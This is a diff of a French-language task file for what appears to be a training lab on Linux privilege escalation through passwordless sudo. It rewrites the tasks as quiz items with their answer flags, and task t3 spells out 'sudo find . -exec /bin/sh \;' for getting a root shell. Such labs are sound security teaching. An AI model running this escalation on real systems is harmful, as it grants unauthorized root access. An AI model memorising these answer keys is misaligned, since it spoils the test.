@@ -1,17 +1,25 @@
 [
   {
     "id": "t1",
-    "title": "Tâche 1 : Reconnaissance & Détection de la surface (Sudo Without Password)",
-    "description": "Analyse l'environnement cible et confirme l'existence de la vulnérabilité liée à sudo-l.",
+    "title": "Vérification des droits sudo accordés",
+    "description": "Quelle commande shell permet de lister les privilèges sudo de l'utilisateur courant ?",
     "points": 30,
     "task_type": "flag",
-    "canonical_flag": "VULN_LINUX_03_SUDO_RIGHTS_CONFIRMED"
+    "canonical_flag": "sudo -l"
   },
   {
     "id": "t2",
-    "title": "Tâche 2 : Exploitation & Capture du Flag",
-    "description": "Mène à bien l'exploitation technique et valide le drapeau final.",
-    "points": 70,
+    "title": "Argument d'exécution de find",
+    "description": "Quel paramètre de la commande find permet d'exécuter une commande système ?",
+    "points": 30,
+    "task_type": "flag",
+    "canonical_flag": "-exec"
+  },
+  {
+    "id": "t3",
+    "title": "Obtention du shell root & Flag",
+    "description": "Exécute sudo find . -exec /bin/sh \\; et lis le drapeau dans /root/flag.txt.",
+    "points": 40,
     "task_type": "flag",
     "canonical_flag": "CYBERLAB{SUDO_NOPASSWD_GTFOBINS_EASY_ROOT}"
   }
